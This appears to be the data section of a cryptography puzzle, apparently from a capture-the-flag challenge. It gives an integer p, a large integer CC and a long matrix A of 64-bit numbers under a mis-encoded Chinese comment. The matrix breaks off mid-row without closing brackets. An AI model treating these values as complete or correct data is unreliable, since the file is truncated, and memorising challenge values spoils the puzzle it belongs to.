# æ•°æ®åŒºåŸŸ (DATA SECTION)
# ==========================================

# p å’Œ CC æˆ‘å·²ç»å¸®ä½ å¡«å¥½äº†
p = 15444306518755915379
CC = 34117838417393645245232889782433844371448224358809402851502421141070689861491276117211335848678483269007265404950503463080005497089800226646525359172074859315940783930656864406105964118013

A=[[1450710298711545183, 11613466877472392201, 14233191140449961456, 6373346453346641480, 6980489316477122618, 5008982266985492346, 11242685804167930101, 10379435150116656567, 3347797955917433992, 696635699159739003, 6633923386783065100, 10404434999034069816, 45979939962763183, 4956385655096972887, 4638530576732095588, 14245636023577449944, 8672929054447175130, 4125410054685875407, 12105710324036578972, 3101759751229495577, 2429973082960340825, 8681608570834662558, 14444798217044410719, 7480429648871953393, 3195622759932393626, 11587740608700078620, 8662370396744914236, 13809088999539626143, 6944225936907033905, 14366255133709708691, 13462387071161710945, 9915453697386067608, 11415272490860816613, 14733715521721520998, 8958230604242112445, 6689727930540873018, 12351124324890273408, 11567064388252813235, 3839546693921895130, 3492527222246179950, 2349006240132725904, 5813057612912000723, 3553294923013981836, 10533224294385104890, 1079977983943180162, 5190931693580995813, 4934571242883565204, 15222826418536411783], [12058173587130217821, 1874034475375156679, 1287994629834389226, 12513309844256116600, 2442798051670749621, 3011915982521967501, 7016821461349515920, 1213889033997624822, 13731620404938935065, 4815507614507970170, 3217346166710602485, 10028219149526428631, 3272624035081997351, 1691790852058617395, 9261942694326991169, 10739095368002993083, 5406427453305507823, 6016189096902821988, 4856656662457403844, 4427308852756963820, 2138786894942268126, 1266983515926767164, 11366829345677976013, 11354503844508804464, 1423127112131796260, 11365461709685945104, 9269910877607890364, 9309827416557607206, 12349315777350226085, 1435670408464117851, 1484199406115673672, 8621944853617718109, 10692012372388847730, 7642348975942731307, 6363271741682328592, 10027042042633259358, 9530710715999572408, 1635918266946582926, 11869197396022485526, 2189404241503808554, 10599799385508302149, 1671478053529797484, 1393328810099582954, 12278511631489095528, 8801923111011649141, 13519194425329464623, 6612009791487533300, 1311008004459644867], [7131392066504814694, 13416578337306632738, 12706667860074730089, 12419405013029661530, 3485409998472711083, 12656265610996977550, 4309964477649804223, 8658540281619465783, 5222656086252647973, 559716375371829623, 9418849074975477600, 10400515901673119239, 9742031916931359608, 2427648684713317995, 12111608732718343668, 11829108416485303927, 15384046100504655893, 11917493344638743325, 13624246223074890299, 11337768118994105227, 9673152938754148795, 11626073620998635156, 4257425206269856232, 9186895711318745085, 3880185593682556208, 7389883128962607725, 9282154349738170418, 10683418461465074861, 11029201189547073521, 4503383419568085724, 12542609663413800416, 13986982555175570529, 8380022546095862959, 3852527345036694679, 10585295919931937890, 1138140534808902130, 11581791033604707655, 3490340173566422479, 2994767568095717860, 10107062290856174433, 6091305866578525372, 6449074827835014540, 12403149345349065977, 1072964997229075722, 13171384864838424667, 5501001995164808151, 949658820580546424, 13635231693572278341], [6598670581266490094, 14007438631483324968, 12926108681138024617, 9730495680935434503, 5907544183316793519, 6498179832862771652, 15256383215870594686, 3906290341470476486, 6339176717751928589, 11707140148504809136, 729721170809208385, 12391445412275807684, 12470744372607804151, 9979618871370650193, 2373564822546349922, 8461271533324360111, 12870192025774743177, 9511273649802755812, 2940230562468423201, 2380799885759628586, 5545812873815974588, 2086980342423005105, 2475274891429368900, 13248273372699694683, 2391218319582697345, 8439433510496317364, 13917006947640222133, 4515872264852584210, 5775254818659710260, 1798737132609203547, 3780243054984872942, 4154758150496376826, 15099909215736056862, 3244384609668649260, 11288167435688235858, 10861212016415109871, 9438536343556604439, 2608484750625098777, 5475121304330861138, 15097371400939714431, 12310567408795308073, 12481160325066023345, 7785674868771814463, 10827165669504078129, 8979792108926048753, 3455356122526423003, 7070531810189362806, 2225347553787807876], [1142021901795548043, 756325890731266488, 5368843353411455290, 11791667571483328354, 4804394276578075864, 8339425176540581056, 1511795919958385839, 4578803215396486869, 8748234949567468855, 14855016784755456489, 1025308852522526374, 11823171822598847370, 3818796993151266269, 13559643911325638692, 3084359772149293309, 14361162657075092026, 9730751621255557071, 10564988500795511175, 925163570185691793, 2880750770987822997, 813228449525480275, 11404764081385841090, 5102100046851862309, 2081756448682100545, 11886061140573793618, 10018705388380372353, 15380103798686064263, 11882262645005266355, 11219538515133669259, 4720485938712921040, 4365730657723167043, 8152408887284241361, 3809807169301294404, 10986299231530612216, 235620967756972363, 10982357582388014370, 12644633699481621694, 1386424308461762214, 7186433269060257493, 3310417079356879760, 10097058187320145714, 1002661577039632767, 4603419367582625772, 6188905337863183571, 6344876471040010607, 11653440139670060227, 4836909719042666090, 10502490593011311081], [3730383517917924733, 2903891861239651043, 2410814444267039986, 3497360243343399476, 8597104448311675373, 12734635540209536985, 4795345085051611879, 11161029812638349769, 6283185940558865414, 13237655683637073644, 13810657295398766773, 14301866325768215960, 4981257597153038462, 3059864193647703189, 2449414388934501544, 9201816190332497417, 6747760156214922957, 12450740239921604072, 4875967353483563598, 3030333414804659307, 6458915273693002134, 8341882307879044118, 10661161004248630207, 7807266665388680689, 5963674532661041908, 5104605524487532526, 1059516366438362120, 4126741871492101569, 13219623490540387833, 6146290559287915859, 10528973049874437374, 1507556569882554223, 11923613888624104161, 13028924316273536856, 3159039217400952429, 7860227086454073120, 10600741430751964892, 13701117806505630130, 1331606059818324867, 6229405068904859995, 11567623896263161264, 2762823742643346538, 7436211612800764321, 2459027028913939617, 1117268322624372613, 1658923301013274912, 7979609975521424996, 10304841614391956031], [5622144940523427361, 9911795656345761102, 8395726275302900885, 10578959863292983034, 14497842781787462675, 4846922500324236976, 2445654011301361943, 2193546321294372725, 2511758577160945428, 7268658718399269406, 11661935619850921778, 6387271072552875542, 3318942437372565498, 11135661039463766733, 2772957992127243214, 10658489101613090039, 5117300476383194015, 3162343882005193275, 15405044796568236707, 68395456434571446, 13370979539618777986, 740454515951776710, 14751826312861268521, 11149586092938410375, 4510671961740730432, 13598232749827586952, 7570109036123531250, 9960517479714480380, 5595870578431234516, 2679621811362821557, 10571256000929266460, 7418728540916546703, 9558567548031987708, 1650194129147849710, 6713997902161184795, 10847100957017784406, 6592999664213410913, 4991518495996608101, 1295169040951731266, 9739472075191399664, 15163260033396410512, 8469274825808897783, 6550083482078074132, 7738674384925639538, 12426275126666508426, 11125631357150629533, 12424940120177957943, 1492525922040049719], [5162933385859180828, 7782729577275460753, 1531263379055938174, 2845601642665456254, 1471865813552516896, 13537464654284980377, 4010427649899073074, 2719994012622707175, 14684430255961679591, 10038092302704522834, 2145519302418288551, 1456642941770859811, 2946915974612924837, 13463960692064162012, 7714748011757108884, 3253907988102071680, 7755894272528637061, 12505153586209271367, 4192886575700053893, 9602915737519408689, 2000276329645704496, 8216242701414353547, 1777378270311067965, 2356490360817537016, 3723587799284583597, 11233605522504665413, 13184052065016388761, 982585401564261205, 7798155202508032436, 4349265659966366567, 4809444930874318547, 3706653636194437661, 8253116927464028674, 999911626195775906, 14030054671607310565, 1465201414416061411, 3410588616765424483, 2153819959155017685, 4162991499613538770, 6829662034542955656, 745793650962199581, 3730984003405676651, 14403245934869927425, 14183414537346177923, 7797873440899487188, 14496062324290085457, 152872964638111639, 10482500404376389806], [3097261783485211261, 10650677981698902913, 5559744100278868557, 3415847832447616135, 14149957320918742824, 10755402026664495482, 8333896683810997114, 11050635314579794361, 12241661178697002832, 11733072397343305577, 4217638241073070155, 7434943457694017743, 3112429145590850993, 14802580444248946905, 5273083849880910570, 4100522152765993193, 2733022571929724268, 12956213128768143610, 4070904732926974430, 14816817268049585490, 13591575031591612387, 4314173397204637792, 3359299029930831092, 5184278091208248999, 15421196067551897599, 456954584076972046, 10787073187537360082, 11589050540965988559, 1252611262029612057, 10019175518229112084, 8041132425154520043, 699442348395133845, 12099789737373213322, 6145903102905511456, 1579106566355013340, 4107538090404592523, 4599244079111546530, 8233992099741446229, 6639271426899570201, 1382402658463542935, 8707588923316203736, 7974159016352314196, 8854253199884557250, 9621226328281017817, 9708846426127575109, 5115271926991725972, 6139149398899171088, 12885802770646214382], [13748382365822845165, 178877509451014905, 9984654839623548643, 1454045344226606293, 10882386993712664685, 6820565839294469328, 12615822463754319840, 12012931783613635756, 1367525331461342043, 12418752027864670217, 9811130751621332757, 12803306300836820311, 1288638899602015465, 136695012262792540, 12793520077537158254, 13619916675445077879, 15070953077702302990, 5049510637954197178, 14844562859431517768, 2031753725309076313, 10695041719928641419, 8748233862189727941, 4333282436564919295, 10454272765970109668, 2321058517449491033, 11323348110576135431, 14939912590857067523, 4894238572741840391, 14386783898679360858, 3211378963388476016, 14641822500581248769, 4112236894124465921, 3866862635646089229, 896016168413938526, 12879846136633957650, 12173534156236255320, 11317078493435836205, 11320803894132446115, 15381028034611806777, 3801770621494083176, 6090025999176876779, 13882449535146984240, 14242489222658063030, 9230440796336737135, 797580396658392828, 11144867105272800409, 4155146296789624818, 15106648978248288966], [11012287130577557929, 1008490675181679264, 15184801048397396014, 8819187893067251070, 11689459564312254161, 15217984018763592532, 1491808939706611678, 1928070833432917584, 14521341211059270269, 13160714384916045689, 13358057854181411532, 2750897934991813080, 4992490016903734245, 8220378596644436859, 11460859284808938731, 7759603445819579091, 50419731667822659, 5484820291582502609, 15347923560689845809, 9580382023190258029, 11495416132931558380, 6360264715549387640, 3342011679809285929, 2206307501411509318, 8080832291825326373, 10003787611165926051, 1071644128598564964, 2408206100117982111, 11697108900169861146, 2405015009449964300, 5284468846889577987, 8402859258106322778, 14143356133814698832, 5355588799319926798, 7632050681285868193, 3269519316920359272, 7059793543270596485, 7878107330845906086, 3887914324792813125, 12513873126776110665, 3621712424874014312, 698546396632733076, 8244547344991507918, 14356954582533548369, 4569620225002336368, 3505488748877667141, 12134348319343671856, 5784168046500892], [7505184317815201303, 2294330941140401935, 7250809612461856105, 7180629730395541371, 5064355530697117544, 11621711751657785734, 5094188451998684704, 165658714358273106, 1815759947288263784, 5173563600425036034, 8665786533751554900, 2644898586838828512, 5774899697708241584, 3700788226281224322, 416643600210595655, 5428685170155831822, 169879019085885313, 234497505640859838, 4270735056264810037, 2273578883092355583, 12641773557774989401, 4153513274183131924, 14527639636955949715, 12749112165118451492, 14538989047789130810, 13818028873286816897, 15039975479726095795, 10067023412032299648, 14430022643669592398, 7830022744422961197, 5769487175321720240, 7091573718218410452, 4988965009518708145, 10966254624408436203, 9169560585013962145, 7485444712576431421, 3949132006886872630, 4990682057605741623, 8787823222773753329, 857502976745018266, 7072523356007745205, 1416436719868677040, 9467517262689371295, 3793223835508267927, 2722983325866428675, 2060877405957752047, 15260792609296074749, 14601842067735113685], [7321482506082924998, 9857737919395580965, 11565220191035547559, 8330719135962450196, 5086115041337764292, 12179383949451569087, 9078365974732098271, 6391059019177051778, 7718004513706704118, 11283381916329144153, 11120235256018443636, 2494029586246614746, 11252920518002209641, 7228013941798639634, 9939292544242154425, 8778423023384062675, 4209549131108796358, 8357762906636928797, 173369673964622568, 2424039182801850061, 14103387023241519714, 7858653737632073191, 14257995408046144994, 9913334773319457997, 5595615826279109544, 11904114335707293708, 688431194012665060, 9919972668140331898, 11646338157952494671, 9157996368974393972, 12915032165736963274, 2697322459423168888, 3662234977468479229, 11615979781834604698, 15077535735590814282, 7374663444057610684, 8155372053325972410, 4513913160935124587, 7483529730905195766, 10233750406834411815, 10915341601468822630, 8726106333663957018, 7667483842044833720, 13891496075629545733, 11880505769955281885, 499619488366828146, 5921622566826294089, 1584467633551073343], [10284303284321878453, 5417012290155946765, 9588576875353626753, 7474136932877114072, 8434352259950479451, 7871612711346949994, 8603222152862138682, 2767688868849105033, 6090820750567124887, 10040760609338593787, 9105969274897471851, 5480600606315606659, 739434869973664705, 2669628049810135971, 14631116868670242484, 11510444016680247390, 9197186076270855347, 4173766615766750492, 4269052980489124837, 7574319784828733569, 12566312051918900383, 13558797736116742954, 6272290930690946822, 3560927132731675563, 1559724277329778595, 1704910379022845020, 4538428676394189144, 4054735379691190043, 2925277219684706219, 11079999092056496891, 4401115132597403736, 4508887393127572930, 13551993938283724384, 11801367797009633692, 14844665701784622957, 11879259191156569014, 10928271619681875428, 10715082985278977796, 1824620673575356341, 7943623027808506978, 813780460099806283, 6663921538895862607, 5935973202703864531, 11971400783167226985, 616683942994951438, 14305442086181646132, 12055344384920770683, 8530680038236967312], [5002626264678143334, 4076384988711338535, 11738565901853971550, 11625072411414532226, 10796754842405479594, 7468688783061994917, 5116829567631258154, 4455029549820923427, 11551347636886149550, 11246427453826999388, 9597591674264206203, 138676239524700737, 13232899575534617577, 2177073782783607358, 7121511304571995970, 13309043557520032594, 2965095623331622320, 3499010369078213749, 5620562474025167070, 3442338881479690082, 14429937521998122627, 10408965055340713321, 14592979510742880800, 11182963926223527559, 4337752948207314665, 3963145920384380098, 13520779056008731247, 9355809505587274790, 11944197583348921052, 12556411664696330488, 11456655992783306668, 4017200030121578215, 13805010984990588245, 9270042979832180119, 9118925310255707861, 9743918354011512658, 8739824013335190675, 6497961649849709425, 14542655508299989944, 4665677864901693337, 3546836574056450130, 2601891055996097096, 7404643992382091991, 12478727732968046060, 7951030658493006382, 494151040438597893, 9502205835390535694, 6159186201441363478], [14797753945630035885, 2728986514764662456, 2236503254933919121, 11025581156946857397, 7819617075983641173, 2556622386192163262, 13992215465954892949, 9436133168669338409, 13644930789006138703, 6809901990614544081, 11969438177653723388, 7207271629322191032, 15080000793762170967, 7439652872864557174, 9001840631624625211, 5322046977120895882, 7583101269094472779, 11724698330653060243, 12083222105233269605, 9049445733480575704, 3629265960190464644, 13467953990079553702, 14616878469953230818, 7022065779606743277, 12313159963563611970, 6525055423327723511, 1876685274333801318, 7875340522247964940, 7274050175118306375, 7474408008740959616, 8537081572594368315, 6518330531929461650, 7039949673104152519, 2224994026344571816, 10985186826351836577, 13089820562345924847, 1102399915610072889, 4477074519824322992, 5102972560759721703, 12801953497131334331, 10980082931105230457, 2127267847750261272, 13471974416851540832, 9575871588083966863, 4555378867082362415, 2304152322165509858, 2328876310999077977, 10241169250632283378], [13318766452288068993, 2439290472948244055, 6465714372653167673, 7682483664029167128, 7147374712638292939, 8649691061126780732, 6157165964774859909, 847343080541370847, 13294779618389805791, 12648112394699158091, 7897614243855605752, 11385842699745403482, 1044392443126246369, 2705688688967284110, 9681164044173112595, 11329879286370938234, 353136480133383884, 7783392622727383556, 9580936461222266445, 12446243157808981466, 14667401539478747506, 4169135319037534568, 5995524887984697941, 584092204245384712, 8465003352151283900, 3520238696869758461, 4363242480696732689, 5872698872002616981, 3504546905829099270, 14351585402330988441, 11502476607614887446, 1022341977245598207, 11037834634789640790, 4968398530104490924, 14579165267595225743, 11796973623361223451, 15226001425223963348, 8925182942552285296, 6945474082089388110, 14689716459528352193, 12451898830019218204, 8487271081779354293, 6017336412861403119, 7996953517076540149, 971184455183592357, 14074971026810889720, 14168445954078815719, 3068704460433898463], [9101683282717483630, 1277009111957790358, 10764564505427778467, 14754138473826871954, 3261616362733110087, 1709608163268577984, 6620354125392423296, 5231284105816430797, 3971030445886070984, 15317749215961493594, 10565613586247320121, 11297730720715657004, 7289958980040219573, 7413646316282250107, 4830661858511699940, 5012303160764113447, 837948345467749879, 12010314609275660690, 7381776158448190282, 3759819283735918575, 3921594647922733818, 15043765292406620091, 3281481572685682534, 2860350099828531103, 6472194193036165978, 6878633978840602212, 1030870327236219007, 13440330749142916389, 2958095353254695987, 15057543600132693020, 14958165758105812981, 4868382346869196867, 8490466716136182711, 2799385140021496364, 713804930121894740, 10208649454569309407, 13411546779303060741, 6147510558830621620, 2268188260239240868, 12953166772429477903, 8072479832588712800, 5604512308431167300, 14155217098819347990, 4488692337456777054, 10015595278313155608, 9163673853933005792, 4909851509684491997, 11462939967291446861], [14433851658551091859, 12951269508370636894, 1613605382520816974, 4291107782388656209, 8824154641695491203, 8126525852063885018, 12844799723807945762, 6212388879018410031, 13961714347349002671, 3279386237291234113, 8811795588641210141, 13762144998873427359, 14725739756347797635, 1518478103765612002, 14634299118574147143, 9974378534423121710, 116801321477218612, 5758804833014706475, 525926349892248127, 10706799863583944693, 8967685637122716384, 2427418359813993759, 3580749486275697997, 10813174327721304417, 2606684373521083013, 3940184597129166047, 3690834689326820429, 10701317728070572897, 3637711473943242061, 14308250541516569246, 6092765608989917739, 6721149524984065923, 14355052040785498104, 8660013564135439392, 7388627427781421384, 9120862214140885641, 6884818472128793074, 7903417955604529591, 7933807738557228929, 4762095332086878128, 2222346110359771156, 4336917491523823528, 12354389225452296109, 9053854093820443589, 12263842397400622912, 5466807187453917330, 11258219470505064150, 9382267992392689556], [5460186686773073494, 2063625000950461466, 3567304395697079072, 6146239407712535861, 8288357454831309008, 4818756440359003811, 9368526415970213218, 5690210985202816819, 6300420549908053116, 72603211570068350, 12313372979818092607, 4561721996114359605, 14232660912968066663, 1834735009504045248, 4507937074775650318, 4560687665950713983, 8579033011074744584, 932511286932279040, 10681490372614851499, 5289944782226528318, 506548879151628467, 6629096336638314186, 3074435666631074839, 4608816655637709223, 591999505563000136, 1932781100218379246, 3223168167094145068, 12945648824649480425, 12009757084640700965, 12272304392733949502, 10473517294622176739, 8080450327751862836, 4941692562922965450, 4680269938422719796, 7690519896164004337, 9450177858193152744, 12580568060793670711, 1901899632920049477, 13837822639752135152, 9105699270078852876, 2403083498348602837, 3491013083464295471, 7124673373676213246, 4029596849633630578, 12967493012972238278, 13051706447295435764, 7950269517103725086, 5559953236816634194], [3502139692174761334, 702415691017717722, 14130839129099157708, 2433466370417664773, 634616481131691803, 8149918623936692530, 9115387404275573085, 11822061262920626123, 12956959199999861135, 10440523720015918588, 6920735941789909802, 2400315106253222978, 3127226236870370553, 3932804088907918727, 9284942281167568520, 3589295865241595522, 15219681003459747558, 9631930878333616017, 6847257049017469805, 3759414839658416106, 14527845240283490363, 5988851687647924456, 7734424690610201074, 12565771144931148274, 5039202013373511891, 4227944049614881221, 14551741210008402536, 4488218672346866276, 14644566754734987275, 4278712932443321133, 14148194332272833527, 231793679831205762, 1368449503307735917, 4430974739094231864, 13484650770621012502, 1889441746295370465, 3545790751495091330, 3495900623972134443, 7075564158570893905, 4038536296932965384, 1134505666337875430, 6248592349786464834, 2199328373403511933, 13671677543271206171, 4879986931765521661, 10162867039342667163, 14386602893322486729, 9612322389476132210], [4899932314905979330, 11620601970926996342, 5086936209630500986, 7217609796703794418, 3251276579358477269, 9975274626730082349, 14681244407891563040, 5049092395176061241, 11878493175416582526, 8286383495503710706, 7860969793972952131, 7680992363866243502, 3462110912083280651, 13003147770463600909, 3769213374155210991, 14015845522087430460, 12598301890201419844, 11759566212818304550, 178267788195504051, 13621006861101540050, 12321083124230572985, 12443582746799819859, 1760130080908996180, 15071221984001881619, 12188943997482211195, 1682299375990724954, 499086028120979429, 974041012415228175, 9856007577498891923, 12023283917280055377, 618755488630455192, 3848312886448092767, 9190283217333553597, 7894970552125927457, 10554915389646795736, 3941914514079213614, 6786465369202014622, 13826657739626709645, 12175962410854421132, 11505916996987774370, 2206402621456486003, 7006369834702178371, 7844015682529714287, 13431613232059604681, 78527493663835888, 233345132906258450, 3045046589336524767, 4113235368040370073], [10865694671538558317, 7331032365559563875, 2304072696604235439, 623219136179517765, 1092098983579943266, 341283987012362451, 2846589300494781369, 9253967103258845713, 15362412032621398444, 14352999542882240170, 13595881267701271075, 14794371118063554864, 9289532074068460557, 3517623917570083738, 13469586112803187513, 8935132566446288822, 1025304860982139897, 357080492807459126, 11812135465881059584, 12247432637554686629, 1286321290716560286, 10368394405666273966, 8976155605812987352, 4900548107777534123, 2248285314536528448, 7083598150132125840, 7357474701698063629, 6598534211009161499, 4827555647635587307, 5723252012860609223, 11862684331309459731, 1725029789428950615, 11885598475914543371, 7365775583244531542, 11571127049544604074, 9745764767658158535, 11801492462986390056, 2615878224713397272, 15102535850358476132, 9337089502437872403, 807655553311824384, 7682807830621036700, 7629062768624669761, 4904999720168125711, 1830980428817723924, 7947170170027568271, 4227644657670364923, 14355141215581877622], [8463632277672710638, 5069550618167045698, 14233343095375826258, 2069292715584631883, 186008184131048283, 6716901466321792857, 315530041264970977, 6760870393964958507, 7521160600269141610, 1272154623835153150, 4129488575596823761, 11949196922255052155, 8940878980085401012, 8512398598553350437, 6044045807694561683, 7644249755519488623, 7997772291709413425, 1596793615344709520, 4295362745272271829, 10307436165310979948, 4185120838183603840, 4895024846535670029, 4905168021734501938, 9164669931072892757, 2758607745734267449, 6907099214621231654, 8367686262475509858, 15325786226678117971, 12499320540606912546, 15294035696518853227, 7681853601496236512, 2642690360538000432, 7315523268448948702, 12339856066219552563, 10083009127849847833, 6584915804166305106, 10111477162368700867, 9499957690427218264, 1271818092158569241, 10921461748012288700, 9063402349570413746, 8364587956724196309, 2012230775875186949, 1293238866928213618, 12225418265133285286, 9787315388393444096, 3096752621468568342, 10377950997359639977], [2208076048108952807, 518129394647109401, 12519544247410254574, 5847931548603672598, 3235090785040945982, 9434953480806132447, 5297225582136239413, 8544412066471169023, 8457341206676715423, 8108662568628883710, 7362052437549788018, 11468805646136121568, 10621417208879279505, 3424732414123889802, 293592555697738901, 2820526909827211479, 8231261426293691511, 7626639573832488806, 1662524201137288551, 10379971254400230311, 14981728379218351397, 2809170083165349858, 2095808643215761180, 2171149044261279626, 7508002670500285731, 6632162486861340251, 14369902324914265269, 9975909708795961908, 8942061282231723062, 10259989896328813826, 4199329370384050665, 7995588023153733265, 15224465419737375464, 183284694618900550, 13726710943250705739, 13229760789156567636, 7530539314242288240, 743033302944200466, 13587464013246775780, 10633132082679330697, 9615126996329123066, 11004340241199806322, 4938494581678436088, 12275010557033612785, 11438433802207035222, 12964027293487170538, 2070178686473783914, 15116025464544846261], [8415129800686057414, 1216609226300763828, 7486010283360139419, 3570120676686839328, 10323990069730264297, 14583125090525183788, 13234268528395174509, 6611961285044488563, 8841749677945854222, 13311474562272830197, 12838456748028482879, 358215347152015628, 5858853346994171787, 2701305415082259010, 849566986812033018, 7191123563366011370, 6510733784534716289, 5425481135891136074, 4230088297966327995, 3374071844536828625, 13384055698013362485, 8732473325859059270, 3029796173028487372, 2263284932853869575, 7035495194743903862, 8621750954976598188, 9094840175419477481, 12110835059844655265, 983937922486127238, 11069435528116481637, 8226562549543644882, 14224873677093336335, 14687621985658650361, 5770449026827988197, 4783329887880513529, 4634761970391001402, 14659473107592034864, 14775215984273976619, 1083083800424565341, 8559555837421407915, 3587300628194944170, 14051919608848689098, 5967620675480488786, 12003760172194120004, 2092652533448772813, 937711316431162397, 15018233385453052271, 11711362443914244114], [11373179430628609090, 14494544553909260833, 1812537110613367548, 5538340352338360156, 13854546686978371020, 2352776722546103011, 12206829793190417019, 12976010005661480183, 12757567108087284966, 2661074155380800605, 5071734419219977418, 11007944780416554042, 13799991989662993684, 7282241743234080133, 11561964842655652860, 2426890608153473376, 90531424774962638, 3240796248375502582, 6011197561535744063, 7002914908380072259, 6303450729370646218, 13993436748066773970, 15136977826916751671, 3367479994355739961, 2632701295589529606, 13276121642520313949, 10758755154264457970, 9546955068601187215, 13450729173751682153, 7866753121466013061, 7518680491668715377, 9232142940687861022, 9070074100636875657, 8372090326980842067, 9794811431605321917, 11930212903802520518, 10922305278305504355, 8413998223167181023, 12653933110845235176, 4791075013351122005, 10952361528420340476, 10123365818049499344, 344640409222558597, 12608380403826432598, 8022739272776301993, 6126116250710342011, 2016751308186607145, 2453108088739147570], [7275830390051688026, 5874742122493599391, 14117613375423496667, 10743046857691112832, 10803959072579858914, 13179705264808395406, 4994787428053004110, 9148550806131316151, 6721120407309806699, 14798436789936319084, 12826626375863439589, 3537811898888748905, 757791812956616102, 8814555751330272139, 10288685222837554432, 1237517820154071104, 11237058684275954671, 5063235494943365425, 12610922339126092510, 10381059201957374347, 13242190193685547159, 13794791545276771263, 2831922671945114953, 7788121547766094138, 4951695955602507541, 13579535170386323050, 7565271607438457253, 3010355118243124831, 12796496497739299918, 14413455568769519203, 11186988406951173202, 10386737103948920370, 10321298182517643821, 6668036908137776527, 8209622809959640570, 14590929815594137187, 10556144499327934975, 6742676872663682104, 2012417502387282863, 13730586065347786001, 13085909441288764853, 3609538803196964109, 4713524066099287958, 10460990903177925529, 15274623172205350758, 8864930777920867518, 7785289737347694413, 11362530396686484342], [8495933239523241799, 6061623065748741599, 5852783644520592894, 11054948268116291818, 10744701093931785000, 2842916976892932547, 2316251612148828328, 10872231499456182347, 1482295169125634201, 15212988501541606327, 13664487566706203065, 4262677688061164784, 581152475252754435, 13151485134414782975, 2782566556870051366, 1918080379157827819, 12382893848118124136, 10625534909003205961, 7222024013477633726, 3090135934594097492, 7912934222481705410, 8051465140491367412, 5311009410950973692, 10559228206937737848, 8463880842933923703, 3284357830696632423, 5347172630147014879, 7937947485811927772, 4404201785215401052, 9964343613636087274, 5334240528852227446, 4487810041051247461, 6820225233006087745, 10790178685499259419, 10534002967754606247, 9342804966728617658, 8965069833305899334, 15045486199300363472, 2665112414755761568, 12801413920649632898, 12825077898901792148, 6382070844440186088, 7402968665851415434, 3590701017231554112, 8465182377831255276, 6672176524898536931, 4627665065642735460, 13084195753901584081], [12205776339082684701, 12806155526811198178, 2498152490384447964, 3599065953213173380, 13134063234188451453, 4758920303249340446, 5163263252471768648, 8429064869009608083, 10821381627841602678, 149395774754157167, 7853001541754878118, 3259593905756165401, 12623478944017215324, 5975601791693877146, 8964357765056895233, 8037057886686480172, 9406426221320873710, 2925067467512695042, 7262540574505172780, 15139986012684795549, 914192113644724208, 7420438808143263015, 6514984768236492829, 4179290741187593585, 7354688620671556198, 5085094300121412260, 3980651818531851401, 5459680344405056296, 8796438783915909810, 12258518943615500474, 8417760554184716539, 12147480590744758422, 1117912351215911019, 208516646676697934, 10910929235310746954, 11851304826529236002, 778103040743102733, 5715978582697776293, 10144932611524021157, 665410847248149022, 3438935230497056686, 13086694146197801392, 6504273064407965636, 8224743882019244202, 10436482835090518891, 11791653258398443911, 7264652409880828188, 13795924903773673381], [13961691755045886008, 5340103676598034931, 1706739853370205562, 6189457057670653402, 6376595376297046220, 4296436605798290747, 12447689626310496919, 3855847020022614899, 15354404613694075153, 6474393378765744597, 10731755646806999312, 8593810171011908445, 2941982374121966875, 13672259300194340010, 1683797234303346993, 7979135575592439128, 1338799101983937762, 14467244260482407396, 14586375956355483529, 9005375481169828380, 13762506196909588221, 8120332395137182984, 9800370282702513149, 11905409717730411180, 1257420596603098537, 13017499575071263123, 3711218459288180209, 1507662069940291462, 1169023907047867039, 5363266779867266340, 1617189994447651002, 14890635472847469672, 13852857313872614942, 11490120647346052789, 10527332740450448598, 3169874094927327065, 1584646899243391994, 8093807807042183329, 7496646839547658811, 8386820506098755752, 4074203852309511807, 5012745547699441629, 1087728810585840515, 9628345252873818705, 12607561793233531646, 7761763899689698510, 15285619882307297113, 1646310371447827955], [14657277023797665944, 3520701867767703164, 1964823029812979994, 4550998990419970585, 6203343899257958395, 10856118723224766633, 3318363057762048642, 14611758966255409140, 514914369742481776, 12189922062858201986, 11107971133715072348, 5416722130169228516, 7325090335038024700, 14728201895624829111, 6729677426471137372, 7851591080500917686, 3557844323417504345, 13708704944820640676, 7036725005594063427, 1499906633508442237, 9293117280123485597, 8284275424245199272, 1029258692363362022, 12618004066478836049, 1308089273658895700, 6222208764398383662, 13556380880742217613, 950677101783252631, 3949337109737216340, 2379724848895113092, 10308555118988948339, 922198823763754442, 12985475702469393535, 12358827531662470651, 9130349008504230308, 14376284887502035259, 8446778171685149762, 7518041389286668372, 11447194901536192697, 13553161106595847992, 14162654439994761565, 3848884172552526522, 4125219527815321523, 15256161988398511773, 5290298150886386505, 13140321908473089957, 10317550233350535538, 3029192375887157755], [10474125430357149794, 4270803493447222813, 2666808966081057436, 13477233621983816493, 7998547614738841243, 1606808537954808583, 6469678641543816282, 1641309594696990621, 2693862820067142969, 4072648943405964167, 7418628705063433970, 8377972174010099454, 10422898827470315603, 2639423749309680533, 448179522767830342, 9908917011028671142, 4055838216421504381, 13130867060605855811, 2404032930864726194, 12550184121361458106, 10702804948598116487, 2027173825283963738, 10106274782197811743, 8083741422598231907, 9313018962179165398, 15357324578849019241, 3788049281448929279, 9969290917719964645, 10206174910092394242, 4748737670411755006, 2689214804077858915, 11849304392149179082, 662015868305803738, 15210519124913694811, 9563564119891829826, 1432145056391894320, 14713739181737225889, 14917345412531633408, 10462287593504605368, 14992720152583407508, 12735842501388006686, 10425251749492173650, 11805037723462304307, 3254504890035288253, 11883732013793053066, 3583748352959210019, 14131462113328589337, 5694370329986069492], [1055893272678937519, 10021832422876733435, 2110766450432747112, 6636640810145103319, 517884121976929220, 5834532418140282286, 11470211543736512512, 2706471992989378292, 13847686412772588489, 8844936748574182308, 2201362527605702778, 13781117492818214313, 1010818254854460681, 11849193995823027793, 10469315992697691254, 2984744257755825806, 13737890550683914477, 2357921279913619201, 3370591913758761677, 11528173760232995800, 10611817114069786900, 4839220575536588288, 10351215666704909337, 1523420378746135310, 11586183865927403739, 1028535116380845450, 6740537820924396905, 14868226424068611991, 10966837247949531260, 14602848691853558785, 3004837196046750046, 1761309544178001323, 11168211090412149635, 10949849792355032477, 10160128708682347899, 14496662109032750458, 3042583615274726061, 14838065411175495260, 7237890375459925670, 3319831667055248389, 13979968552795926829, 8268297425488047861, 15177127689337328266, 1759241576573340980, 11130335754057099856, 5634205118095598799, 10983463496443232235, 2461685356512772416], [14151685164075833121, 10266604303192045927, 2604369334970664294, 11952140386164576830, 9115520017811076025, 846381013308325742, 14593766791992137966, 11799603342059783697, 3030380580186789955, 3282009829835929373, 12422175531387454570, 14334308299146693381, 15250694780816332934, 9543086393416024991, 8297596434406574941, 12841617582198941800, 5832162307829831357, 9590774979584589723, 15050577239174679887, 2362821035528432992, 5587278424796764367, 6895375601990656020, 1393149649705383829, 879572552199735011, 8002531791324907769, 8974565322622522591, 